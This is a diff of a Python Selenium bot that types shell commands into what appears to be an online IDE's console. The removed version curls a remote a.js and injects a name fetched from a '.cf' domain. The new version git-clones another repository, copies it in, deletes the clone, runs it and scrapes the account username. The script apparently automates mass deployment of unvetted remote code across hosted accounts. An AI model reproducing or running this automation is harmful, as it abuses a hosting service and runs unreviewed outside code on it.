@@ -86,23 +86,18 @@ if __name__ ==  '__main__':
             az = False
         except:
             pass
-    headers = {
-        'cache-control': "no-cache",
-        'content-type': "application/x-www-form-urlencoded"
-        }
-    responsez = requests.request("GET", "https://rawrzz.nordalts.cf/gwetname", headers=headers)
-    xdr = responsez.text
 
     time.sleep(4)
     driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[10]/div/div[2]").click()
     time.sleep(2)
-    driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("curl https://raw.githubusercontent.com/awaprimPL/expert-guacamole/main/a.js -o index.js")
+    driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("git clone https://github.com/Cloudy124/bookish-robot.git")
     driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
-    driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("sed -i 's/UNDEFINED/"+xdr+"/' index.js")
+    time.sleep(5)
+    driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("cp bookish-robot/* . && rm -rf bookish-robot")
     driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
     time.sleep(1)
     driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[2]/div/div/div").click()
-    time.sleep(50)
+    time.sleep(333)
 
     namerepl = driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[3]/span").text
     username = driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[1]/span/a").text
